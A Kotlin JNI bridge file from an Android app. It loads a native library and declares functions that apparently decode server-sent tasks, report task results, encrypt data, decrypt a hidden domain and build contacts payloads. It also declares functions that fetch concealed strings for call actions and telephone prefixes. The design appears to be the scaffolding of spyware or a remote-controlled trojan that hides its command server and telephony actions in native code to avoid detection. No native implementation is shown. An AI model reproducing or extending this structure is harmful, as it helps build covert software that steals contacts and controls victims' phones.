package com.yourcompany.core.jni

object NativeBridge {
    init {
        try {
            System.loadLibrary("securelogic")
        } catch (e: Throwable) {
            android.util.Log.e("XDBG", "[NativeBridge] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            throw RuntimeException(
                "NB-DIAG: System.loadLibrary(\"securelogic\") FAILED. " +
                "loader=${this::class.java.classLoader} " +
                "type=${e.javaClass.name} msg=${e.message}", e)
        }
        try {
            registerNatives()
        } catch (e: Throwable) {
            android.util.Log.e("XDBG", "[NativeBridge] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            throw RuntimeException(
                "NB-DIAG: registerNatives() FAILED. " +
                "loader=${this::class.java.classLoader} " +
                "type=${e.javaClass.name} msg=${e.message}", e)
        }
    }

    external fun registerNatives()

    external fun nativeEncryptData(data: String): String
    external fun nativeDecodeTask(payload: String): String
    external fun nativeProcessTaskResult(taskId: Int, rawResult: String): String

    external fun nativeGetCallActionString(): String
    external fun nativeGetTelPrefix(): String
    external fun nativeGetRequestMethodName(): String
    external fun nativeGetCallbackHandlerClassName(): String
    external fun nativeGetSystemCallbackClassName(): String
    external fun nativeGetContactsActionString(): String
    external fun nativeBuildContactsPayload(names: Array<String>, numbers: Array<String>): String

    external fun nativeDecryptDomain(b64: String): String
    external fun nativeGetUuidPrefix(): String
    external fun nativeGetUuidSuffix(): String
}
